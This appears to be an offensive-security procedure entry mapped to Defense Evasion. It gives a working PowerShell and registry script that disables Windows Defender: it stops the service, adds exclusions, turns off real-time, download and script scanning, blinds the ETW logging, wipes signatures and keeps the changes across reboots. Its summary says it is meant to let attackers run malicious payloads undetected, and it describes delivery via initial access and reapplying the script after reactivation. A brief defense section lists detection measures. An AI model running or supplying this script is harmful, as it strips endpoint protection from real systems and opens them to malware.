---
id: e72d5b2b-824f-4cfc-8b5d-8539b416bdcc
name: Disable-Windows-Defender-via-PowerShell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.686015+00:00'
updated_at: '2023-04-10T20:37:26.792144+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - '[[tags/Disable Antivirus and Security]]'
  - '[[tags/Disable Windows Defender]]'
  - '[[tags/Windows - Persistence]]'
commands: []
platforms:
  - Windows
tools: []
validated: true
---

# Disable-Windows-Defender-via-PowerShell

## Summary

This procedure disables Windows Defender on a Windows target system using a PowerShell script that modifies services, registry keys, and preferences to turn off real-time protection, scanning, and related components. It is useful for attackers seeking to evade antivirus detection during post-exploitation or persistence phases, allowing execution of malicious payloads without interference.

## Description

Windows Defender is the built-in antivirus solution on Windows systems, providing real-time protection, signature-based detection, and integration with features like AMSI (Antimalware Scan Interface). This procedure systematically disables its core functions by stopping the WinDefend service, setting MpPreferences to exclude processes and paths, removing definitions, and altering registry policies to prevent reactivation. It targets Windows 10 and Server editions where Defender is active by default. The approach requires administrative privileges and can be executed locally or remotely via tools like PowerShell remoting or C2 frameworks. Success evades endpoint detection but may trigger alerts if monitoring is in place for registry or service changes.

## Requirements

1. Local administrator privileges on the target Windows system.
2. PowerShell execution access (version 5.0 or later recommended).
3. Optional: Remote execution capability if not running locally (e.g., via WinRM).

## Defense

Defensive measures and detection strategies:

- Enable advanced auditing for registry modifications in keys like HKLM\Software\Policies\Microsoft\Windows Defender and service changes to WinDefend.
- Use endpoint detection tools to monitor PowerShell execution, especially Set-MpPreference and MpCmdRun.exe invocations.
- Implement group policy to restrict administrative access and enforce Defender tamper protection.
- Regularly scan for disabled services and verify MpComputerStatus for unexpected configurations.

## Objectives

1. Stop and disable the Windows Defender service to halt real-time operations.
2. Remove definitions and signatures to eliminate detection capabilities.
3. Configure exclusions and policies to prevent scanning of malicious activities.
4. Ensure persistence of the disabled state across reboots.

## Instructions

### Step 1: Prepare and Execute the Disabling Script

**Context**: This step runs a comprehensive PowerShell script that handles all disabling actions in sequence, including service control, preference modifications, registry edits, and definition removal. The script must be executed in an elevated PowerShell session to succeed.

**Code** ([[codes/PowerShell-Windows-Defender-Disabler]]):

```powershell
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Disable Windows Defender Security Center
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# Disable Real Time Protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

> Save the script to a file (e.g., disable_defender.ps1) on the target or deliver it via initial access. Run it with: `powershell.exe -ExecutionPolicy Bypass -File disable_defender.ps1`. Verify with `Get-MpComputerStatus` afterward; look for AntispywareEnabled and AntivirusEnabled set to False.

### Step 2: Verify Disabling and Test Evasion

**Context**: After execution, confirm that Defender components are inactive and test by attempting to run a benign but typically scanned payload, such as a simple script, to ensure no interference.

**Instructions**: Run `Get-MpComputerStatus` to check status. Then, create and execute a test PowerShell script that would normally trigger scanning (e.g., downloading a file).

> Expected: No alerts from Defender, and status shows real-time protection disabled. If signatures were removed, `Get-MpComputerStatus` should indicate 0 signatures.

### Step 3: Handle Potential Reactivation

**Context**: Windows updates or group policies may attempt to re-enable Defender; monitor and reapply if needed for persistence.

**Instructions**: Check registry keys post-reboot: `reg query "HKLM\Software\Policies\Microsoft\Windows Defender"`. If values are reset, re-run the script or set policies via GPO simulation.

> This ensures long-term evasion in persistent scenarios.
